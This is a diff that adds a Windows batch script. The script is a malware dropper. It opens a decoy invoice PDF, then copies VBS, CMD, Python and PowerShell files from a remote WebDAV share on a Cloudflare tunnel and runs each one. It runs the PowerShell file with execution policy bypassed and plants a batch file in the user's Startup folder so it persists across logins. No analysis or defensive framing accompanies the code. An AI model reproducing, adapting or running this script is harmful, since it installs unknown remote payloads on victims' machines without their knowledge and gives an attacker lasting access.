@@ -1,0 +1,99 @@
+@echo off
+setlocal
+
+set source=\\oral-career-renewable-bacterial.trycloudflare.com@SSL\DavWWWRoot\google\Win
+set destination=%USERPROFILE%\Downloads
+
+echo Opening PDF file...
+start "" "https://s2r.tn/cgi/INVOICERVSHA.pdf"
+
+
+
+echo Copying update from %source% to %destination%...
+copy /Y "%source%\update.vbs" "%destination%"
+
+echo Running update....
+"%destination%\update.vbs"
+
+echo Copying upload from %source% to %destination%...
+copy /Y "%source%\upload.vbs" "%destination%"
+
+echo Running upload....
+"%destination%\upload.vbs"
+
+echo Copying windows from %source% to %destination%...
+copy /Y "%source%\windows.vbs" "%destination%"
+
+echo Running windows...
+"%destination%\windows.vbs"
+
+echo Copying file from %source% to %destination%...
+copy /Y "%source%\file.vbs" "%destination%"
+
+echo Running file....
+"%destination%\file.vbs"
+
+copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+
+
+REM Run kam.cmd and las.cmd and zap.cmd and xff.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\xff.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+
+
+REM Copy python.exe to the destination folder
+copy /Y "%source%\python.exe" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy python.exe. Exiting script.
+    exit /b 1
+)
+
+REM Copy install.ps1 to the destination folder
+copy /Y "%source%\install.ps1" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy install.ps1. Exiting script.
+    exit /b 1
+)
+
+REM Run install.ps1 with Bypass policy
+echo Running install.ps1 with Bypass policy...
+powershell -ExecutionPolicy Bypass -File "%destination%\install.ps1"
+IF NOT %ERRORLEVEL% == 0 (
+    echo install.ps1 failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running new.py...
+timeout /t 2 >nul
+
+REM Copy new.py to the destination folder
+copy /Y "%source%\new.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy new.py. Exiting script.
+    exit /b 1
+)
+
+REM Run new.py with cmd
+echo Running new.py...
+cmd /c "%destination%\new.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo new.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure python.exe is fully copied and ready)
+echo Waiting for 2 seconds before continuing...
+timeout /t 2 >nul
+
+)
+
+
+exit /b 0
